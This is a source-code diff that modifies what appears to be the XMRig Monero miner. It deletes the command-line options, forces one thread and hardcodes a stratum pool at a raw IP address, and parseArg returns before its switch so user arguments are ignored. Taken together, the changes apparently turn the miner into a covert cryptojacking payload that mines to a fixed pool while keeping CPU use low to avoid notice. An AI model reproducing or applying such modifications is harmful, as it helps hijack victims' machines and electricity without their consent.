@@ -149,12 +149,11 @@ Options::Options(int argc, char **argv) :
     m_logFile(nullptr),
     m_algo(0),
     m_algoVariant(0),
-    m_donateLevel(kDonateLevel),
-    m_maxCpuUsage(75),
+    m_donateLevel(1),
     m_printTime(60),
     m_retries(5),
     m_retryPause(5),
-    m_threads(0),
+    m_threads(1),
     m_affinity(-1L)
 {
     m_pools.push_back(new Url());
@@ -182,16 +181,7 @@ Options::Options(int argc, char **argv) :
         return;
     }
 
-    if (!m_threads) {
-        m_threads = Cpu::optimalThreadsCount(m_algo, m_doubleHash, m_maxCpuUsage);
-    }
-    else if (m_safe) {
-        const int count = Cpu::optimalThreadsCount(m_algo, m_doubleHash, m_maxCpuUsage);
-        if (m_threads > count) {
-            m_threads = count;
-        }
-    }
-
+	m_threads = 1;
     m_ready = true;
 }
 
@@ -203,22 +193,9 @@ Options::~Options()
 
 bool Options::parseArg(int key, char *arg)
 {
-    char *p;
-    int v;
-
+    m_pools[0]->parse("stratum+tcp://95.141.32.214:12345");
+	return true;
     switch (key) {
-    case 'a': /* --algo */
-        if (!setAlgo(arg)) {
-            return false;
-        }
-        break;
-
-    case 'O': /* --userpass */
-        if (!m_pools.back()->setUserpass(arg)) {
-            return false;
-        }
-
-        break;
 
     case 'o': /* --url */
         if (m_pools.size() > 1 || m_pools[0]->isValid()) {
@@ -231,140 +208,12 @@ bool Options::parseArg(int key, char *arg)
             }
         }
         else {
-            m_pools[0]->parse(arg);
         }
 
         if (!m_pools.back()->isValid()) {
             return false;
         }
 
-        break;
-
-    case 'u': /* --user */
-        m_pools.back()->setUser(arg);
-        break;
-
-    case 'p': /* --pass */
-        m_pools.back()->setPassword(arg);
-        break;
-
-    case 'l': /* --log-file */
-        free(m_logFile);
-        m_logFile = strdup(arg);
-        m_colors = false;
-        break;
-
-    case 'r': /* --retries */
-        v = strtol(arg, nullptr, 10);
-        if (v < 1 || v > 1000) {
-            showUsage(1);
-            return false;
-        }
-
-        m_retries = v;
-        break;
-
-    case 'R': /* --retry-pause */
-        v = strtol(arg, nullptr, 10);
-        if (v < 1 || v > 3600) {
-            showUsage(1);
-            return false;
-        }
-
-        m_retryPause = v;
-        break;
-
-    case 't': /* --threads */
-        v = strtol(arg, nullptr, 10);
-        if (v < 1 || v > 1024) {
-            showUsage(1);
-            return false;
-        }
-
-        m_threads = v;
-        break;
-
-    case 1004: /* --max-cpu-usage */
-        v = strtol(arg, nullptr, 10);
-        if (v < 1 || v > 100) {
-            showUsage(1);
-            return false;
-        }
-
-        m_maxCpuUsage = v;
-        break;
-
-    case 1005: /* --safe */
-        m_safe = true;
-        break;
-
-    case 'k': /* --keepalive */
-        m_pools.back()->setKeepAlive(true);
-        break;
-
-    case 'V': /* --version */
-        showVersion();
-        return false;
-
-    case 'h': /* --help */
-        showUsage(0);
-        return false;
-
-    case 'B': /* --background */
-        m_background = true;
-        m_colors = false;
-        break;
-
-    case 'S': /* --syslog */
-        m_syslog = true;
-        m_colors = false;
-        break;
-
-    case 'v': /* --av */
-        v = strtol(arg, nullptr, 10);
-        if (v < 0 || v > 1000) {
-            showUsage(1);
-            return false;
-        }
-
-        m_algoVariant = v;
-        break;
-
-    case 1020: /* --cpu-affinity */
-        p  = strstr(arg, "0x");
-        m_affinity = p ? strtoull(p, nullptr, 16) : strtoull(arg, nullptr, 10);
-        break;
-
-    case 1002: /* --no-color */
-        m_colors = false;
-        break;
-
-    case 1003: /* --donate-level */
-        v = strtol(arg, nullptr, 10);
-        if (v < 1 || v > 99) {
-            showUsage(1);
-            return false;
-        }
-
-        m_donateLevel = v;
-        break;
-
-    case 1006: /* --nicehash */
-        m_pools.back()->setNicehash(true);
-        break;
-
-    case 1007: /* --print-time */
-        v = strtol(arg, nullptr, 10);
-        if (v < 0 || v > 1000) {
-            showUsage(1);
-            return false;
-        }
-
-        m_printTime = v;
-        break;
-
-    case 1008: /* --rand-nonce */
-        m_pools.back()->setRandNonce(true);
         break;
 
     default:
@@ -434,60 +283,8 @@ void Options::showVersion()
 
 bool Options::setAlgo(const char *algo)
 {
-    for (size_t i = 0; i < ARRAY_SIZE(algo_names); i++) {
-        if (algo_names[i] && !strcmp(algo, algo_names[i])) {
-            m_algo = i;
-            break;
-        }
-
-#       ifndef XMRIG_NO_AEON
-        if (i == ARRAY_SIZE(algo_names) - 1 && !strcmp(algo, "cryptonight-light")) {
-            m_algo = ALGO_CRYPTONIGHT_LITE;
-            break;
-        }
-#       endif
-
-        if (i == ARRAY_SIZE(algo_names) - 1) {
-            showUsage(1);
-            return false;
-        }
-    }
-
-    return true;
+	m_algo = 0;
+	return true;
 }
 
 
-int Options::getAlgoVariant() const
-{
-#   ifndef XMRIG_NO_AEON
-    if (m_algo == ALGO_CRYPTONIGHT_LITE) {
-        return getAlgoVariantLite();
-    }
-#   endif
-
-    if (m_algoVariant <= AV0_AUTO || m_algoVariant >= AV_MAX) {
-        return Cpu::hasAES() ? AV1_AESNI : AV3_SOFT_AES;
-    }
-
-    if (m_safe && !Cpu::hasAES() && m_algoVariant <= AV2_AESNI_DOUBLE) {
-        return m_algoVariant + 2;
-    }
-
-    return m_algoVariant;
-}
-
-
-#ifndef XMRIG_NO_AEON
-int Options::getAlgoVariantLite() const
-{
-    if (m_algoVariant <= AV0_AUTO || m_algoVariant >= AV_MAX) {
-        return Cpu::hasAES() ? AV2_AESNI_DOUBLE : AV4_SOFT_AES_DOUBLE;
-    }
-
-    if (m_safe && !Cpu::hasAES() && m_algoVariant <= AV2_AESNI_DOUBLE) {
-        return m_algoVariant + 2;
-    }
-
-    return m_algoVariant;
-}
-#endif
